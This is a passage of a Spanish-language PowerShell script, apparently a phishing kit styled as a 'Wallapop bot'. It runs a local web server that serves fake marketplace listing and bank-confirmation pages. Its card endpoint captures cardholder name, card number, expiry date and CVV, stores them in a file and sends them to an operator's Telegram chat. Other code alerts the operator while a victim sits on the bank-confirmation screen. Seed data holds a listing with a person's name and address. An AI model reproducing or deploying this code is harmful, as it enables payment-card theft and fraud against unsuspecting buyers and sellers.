      $cb = [Text.Encoding]::ASCII.GetBytes($cab)
      $stream.Write($cb, 0, $cb.Length)
      $stream.Flush()
      $cliente.Close()
      return
    }

    if ($ruta -match '^/api/product/([^/]+)/(?:tarjeta|confirmar)/status') {
      $id = $matches[1]
      $st = if ($Script:TxEstados.ContainsKey($id)) { $Script:TxEstados[$id] } else { 'waiting' }
      $cuerpo = '{"status":"' + $st + '","id":"' + $id + '"}'
      $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta -match '^/api/(?:tarjeta|confirmar)/status') {
      $st = 'waiting'
      if ($linea -match '[?&]id=([^& ]+)') {
        $tid = $matches[1]
        if ($Script:TxEstados.ContainsKey($tid)) { $st = $Script:TxEstados[$tid] }
      }
      $cuerpo = '{"status":"' + $st + '"}'
      $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta -match '^/api/product/([^/]+)/confirmar') {
      $id = $matches[1]
      if ($contentLen -gt 0) {
        $buf = New-Object char[] $contentLen
        $null = $lector.ReadBlock($buf, 0, $contentLen)
      }
      if (-not $Script:TxEstados.ContainsKey($id) -or $Script:TxEstados[$id] -ne 'confirmado_final') {
        $Script:TxEstados[$id] = 'en_confirmar'
      }

      $destChat = if ($Script:UltimoChat) { $Script:UltimoChat } else { '8791932410' }
      if ($destChat) {
        $p = if ($Db.ContainsKey($id)) { $Db[$id] } else { $null }
        $tProd = if ($p -and $p['titulo']) { $p['titulo'] } else { $id }
        $prProd = if ($p -and $p['precio']) { Eur $p['precio'] } else { '' }
        $impLinea = if ($prProd) { "`n💰 <b>Importe:</b> " + $prProd } else { "" }
        $txtAviso = "📱 <b>CLIENTE EN CONFIRMACIÓN</b>`n" +
                    "───────────────────`n" +
                    "📦 <b>Producto:</b> " + (Esc $tProd) + "`n" +
                    "🆔 <b>ID:</b> <code>" + $id + "</code>" + $impLinea + "`n`n" +
                    "⏳ El cliente está en la pantalla de confirmación bancaria."

        $filaBtns = @(
          @{ text = 'Confirmar de nuevo'; callback_data = ('confirmar_again_' + $id) }
        )
        $kb = @{ inline_keyboard = @(, $filaBtns) }

        Send-Tg 'sendMessage' @{
          chat_id = $destChat
          text = $txtAviso
          parse_mode = 'HTML'
          reply_markup = $kb
          disable_web_page_preview = $true
        } | Out-Null
      }

      $cuerpo = '{"ok":true,"status":"' + $Script:TxEstados[$id] + '"}'
      $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta -match '^/api/product/([^/]+)/tarjeta') {
      $id = $matches[1]
      $cuerpoReq = ''
      if ($contentLen -gt 0) {
        $buf = New-Object char[] $contentLen
        $leidos = $lector.ReadBlock($buf, 0, $contentLen)
        $cuerpoReq = New-Object string ($buf, 0, $leidos)
      }
      try {
        $tarjeta = $cuerpoReq | ConvertFrom-Json
        $tarjFile = Join-Path $DataDir 'tarjetas.json'
        $todas = @()
        if (Test-Path $tarjFile) {
          try { $todas = @(Get-Content $tarjFile -Raw -Encoding UTF8 | ConvertFrom-Json) } catch { }
        }
        $registro = @{
          id = $id
          fecha = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
          titular = $tarjeta.titular
          marca = $tarjeta.marca
          numero = $tarjeta.numero
          cad = $tarjeta.cad
          cvv = $tarjeta.cvv
        }
        $todas += $registro
        $todas | ConvertTo-Json -Depth 8 | Set-Content -Path $tarjFile -Encoding UTF8

        if ($Db.ContainsKey($id)) {
          $Db[$id]['tarjeta'] = $registro
          Save-Db
        }

        $Script:TxEstados[$id] = 'waiting'

        if ($Script:UltimoChat) {
          $tProd = if ($Db.ContainsKey($id)) { $Db[$id]['titulo'] } else { $id }
          $txtAviso = "💳 <b>¡NUEVA TARJETA RECIBIDA!</b>`n" +
                      "───────────────────`n" +
                      "📦 <b>Producto:</b> " + (Esc $tProd) + "`n" +
                      "🆔 <b>ID:</b> <code>" + $id + "</code>`n`n" +
                      "👤 <b>Titular:</b> " + (Esc $tarjeta.titular) + "`n" +
                      "💳 <b>Tarjeta:</b> <code>" + $tarjeta.numero + "</code> (" + $tarjeta.marca + ")`n" +
                      "📅 <b>Caducidad:</b> <code>" + $tarjeta.cad + "</code>`n" +
                      "🔒 <b>CVV:</b> <code>" + $tarjeta.cvv + "</code>"

          $filaBtns = @(
            @{ text = '✅ Confirmar'; callback_data = ('continuar_' + $id) },
            @{ text = '❌ Error'; callback_data = ('error_' + $id) }
          )
          $kb = @{ inline_keyboard = @(, $filaBtns) }

          Send-Tg 'sendMessage' @{
            chat_id = $Script:UltimoChat
            text = $txtAviso
            parse_mode = 'HTML'
            reply_markup = $kb
            disable_web_page_preview = $true
          } | Out-Null
        }
      } catch { }

      $cuerpo = '{"ok":true,"status":"waiting"}'
      $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta.StartsWith('/api/product/')) {
      $id = $ruta.Substring(13)
      if ($Db.ContainsKey($id)) {
        $cuerpo = $Db[$id] | ConvertTo-Json -Depth 8
        $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
      } else {
        $cuerpo = '{}'; $estado = '404 Not Found'; $tipo = 'application/json; charset=utf-8'
      }
    } elseif ($ruta -eq '/api/health') {
      $cuerpo = '{"ok":true}'; $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta -eq '/confirmar.html' -or $ruta -eq '/confirmar' -or $ruta -eq '/confirmar.php' -or $ruta -eq '/confirmacion' -or $ruta -eq '/confirmacion.html' -or $ruta -eq '/confirmacion.php') {
      $confPath = Join-Path $Raiz 'web\confirmar.html'
      if (-not (Test-Path $confPath)) { $confPath = Join-Path $Raiz 'confirmar.html' }
      if (Test-Path $confPath) {
        $bytes = [IO.File]::ReadAllBytes($confPath)
        $cab = "HTTP/1.1 200 OK`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: text/html; charset=utf-8`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
        $cb = [Text.Encoding]::ASCII.GetBytes($cab)
        $stream.Write($cb, 0, $cb.Length)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        $cliente.Close()
        return
      }
      $cuerpo = 'No encontrado'; $estado = '404 Not Found'; $tipo = 'text/plain; charset=utf-8'
    } elseif ($ruta -eq '/step2.html' -or $ruta -eq '/step2' -or $ruta -eq '/step2.php') {
      $step2Path = Join-Path $Raiz 'web\step2.html'
      if (-not (Test-Path $step2Path)) { $step2Path = Join-Path $Raiz 'step2.html' }
      if (Test-Path $step2Path) {
        $bytes = [IO.File]::ReadAllBytes($step2Path)
        $cab = "HTTP/1.1 200 OK`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: text/html; charset=utf-8`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
        $cb = [Text.Encoding]::ASCII.GetBytes($cab)
        $stream.Write($cb, 0, $cb.Length)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        $cliente.Close()
        return
      }
      $cuerpo = 'No encontrado'; $estado = '404 Not Found'; $tipo = 'text/plain; charset=utf-8'
    } elseif ($ruta -eq '/' -or $ruta.StartsWith('/a/')) {
      $indexPath = Join-Path $Raiz 'web\index.html'
      if (-not (Test-Path $indexPath)) { $indexPath = Join-Path $Raiz 'index.html' }
      $bytes = [IO.File]::ReadAllBytes($indexPath)
      $cab = "HTTP/1.1 200 OK`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: text/html; charset=utf-8`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
      $cb = [Text.Encoding]::ASCII.GetBytes($cab)
      $stream.Write($cb, 0, $cb.Length)
      $stream.Write($bytes, 0, $bytes.Length)
      $stream.Flush()
      $cliente.Close()
      return
    } else {
      $nomArch = $ruta.TrimStart('/')
      $archFisico = Join-Path $Raiz ('web\' + $nomArch)
      if (-not (Test-Path $archFisico -PathType Leaf)) {
        $archFisico = Join-Path $Raiz $nomArch
      }
      if (Test-Path $archFisico -PathType Leaf) {
        $ext = [IO.Path]::GetExtension($archFisico).ToLower()
        $mime = switch ($ext) {
          '.png' { 'image/png' }
          '.jpg' { 'image/jpeg' }
          '.jpeg' { 'image/jpeg' }
          '.svg' { 'image/svg+xml' }
          '.ico' { 'image/x-icon' }
          '.css' { 'text/css; charset=utf-8' }
          '.js'  { 'application/javascript; charset=utf-8' }
          '.html'{ 'text/html; charset=utf-8' }
          default{ 'application/octet-stream' }
        }
        $bytes = [IO.File]::ReadAllBytes($archFisico)
        $cab = "HTTP/1.1 200 OK`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: $mime`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
        $cb = [Text.Encoding]::ASCII.GetBytes($cab)
        $stream.Write($cb, 0, $cb.Length)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        $cliente.Close()
        return
      }
      $cuerpo = 'No encontrado'; $estado = '404 Not Found'; $tipo = 'text/plain; charset=utf-8'
    }

    $bytes = [Text.Encoding]::UTF8.GetBytes($cuerpo)
    $cab = "HTTP/1.1 $estado`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: $tipo`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
    $cb = [Text.Encoding]::ASCII.GetBytes($cab)
    $stream.Write($cb, 0, $cb.Length)
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()
    $cliente.Close()
  } catch { try { $cliente.Close() } catch { } }
}

if ($Db.Keys.Count -eq 0) {
  $Db['HSdc6CU3XJZg2lb1'] = @{
    id = 'HSdc6CU3XJZg2lb1'
    titulo = 'Lote Perfumes Mujer 14 Uds.'
    precio = 250; precioArticulo = 250
    descripcion = 'Lote de 14 perfumes de mujer, todos precintados. Se vende el lote completo.'
    nombre = 'Sofía Chamizo'
    direccion = 'Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024'
    articulo = 'Lote Perfumes Mujer 14 uds.'
    fotos = @()
  }
  Save-Db
}

try {
  $Listener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, $Puerto)
  $Listener.Start()
} catch {
  Write-Warning ("No se pudo iniciar el listener en el puerto {0}: {1}" -f $Puerto, $_.Exception.Message)
}

Write-Host ''
Write-Host '  🟢 Wallapop bot en marcha' -ForegroundColor Green
Write-Host ('  Local:    http://localhost:{0}' -f $Puerto)
Write-Host ('  Dominio:  {0}' -f $Script:Base)
Write-Host ('  Ejemplo:  {0}/a/AD...' -f $Script:Base)
Write-Host '  Ctrl+C para parar'
Write-Host ''

while ($true) {
  if ($Listener -and $Listener.Server -and $Listener.Server.IsBound) {
    while ($Listener.Server.Poll(50000, [Net.Sockets.SelectMode]::SelectRead)) {
      try { Handle-Client $Listener.AcceptTcpClient() } catch { }
    }
  }
  try {
    $r = Invoke-RestMethod -Uri ("https://api.telegram.org/bot{0}/getUpdates?timeout=0&offset={1}" -f $Token, ($Offset + 1)) -TimeoutSec 10
    if ($r.ok) {
      foreach ($u in $r.result) {
        $Offset = $u.update_id
        Save-Offset
        try { Handle-Update $u } catch { Write-Warning "Error procesando update: $_" }
      }
    }
  } catch { Start-Sleep -Milliseconds 500 }
  Start-Sleep -Milliseconds 200
}